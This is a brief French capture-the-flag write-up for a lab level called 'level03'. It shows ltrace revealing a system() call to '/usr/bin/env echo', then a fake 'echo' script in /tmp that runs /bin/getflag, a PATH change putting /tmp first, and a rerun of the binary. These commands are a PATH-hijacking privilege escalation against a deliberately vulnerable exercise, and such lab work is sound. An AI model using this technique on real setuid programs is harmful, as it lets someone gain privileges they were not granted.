## Level 03:

On arrive directement sur un folder avec un executable ```level03```

avec ```ltrace``` on peut voir cette ligne : 
```system("/usr/bin/env echo Exploit me"Exploit me```
qui nous indique un appel systeme d'echo.
On va donc faire un echo exploit en creant un fichier ```echo``` dans lequel on va mettre le path de getflag.  
Avec ```export``` on va rajouter le chemin d'```echo``` a PATH (au debut) et relancer le binaire. 

Dans ```/tmp```  
 ```vim echo```
```echo
/bin/getflag
```
```chmod + x```
  ```export PATH=/tmp:$PATH```

puis ```./level03 ```     
:)
